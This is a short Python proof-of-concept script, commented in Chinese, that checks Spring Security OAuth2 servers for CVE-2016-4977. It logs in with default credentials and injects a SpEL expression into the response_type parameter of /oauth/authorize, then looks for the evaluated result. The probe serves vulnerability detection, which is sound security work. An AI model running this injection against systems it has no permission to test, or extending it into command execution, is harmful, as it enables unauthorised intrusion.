#!/usr/bin/env python
# coding:utf-8

"""
Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）

Desc
    Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，
    由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。
Version
    2.0.0 to 2.0.9
    1.0.0 to 1.0.5
Referer
    - http://secalert.net/#CVE-2016-4977
    - https://deadpool.sh/2017/RCE-Springs/
    - http://blog.knownsec.com/2016/10/spring-security-oauth-rce/
"""
import requests
def poc(url):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/')

    user, passwd = "admin", "admin"  #请自行修改登陆账号密码
    payloads = [
        # 验证poc
        "${233*233}"
    ]
    for payload in payloads:
        try:
            vulurl = url + "/oauth/authorize?response_type=%s&client_id=acme&scope=openid&redirect_uri=http://test" % payload
            resp = requests.get(vulurl, auth=(user, passwd), timeout=10)
            if "Unsupported response types: [54289]" in resp.text:
                return True
        except Exception as e:
            print(e)
    return False

if __name__ == '__main__':
    print poc("http://192.168.1.139:8080/")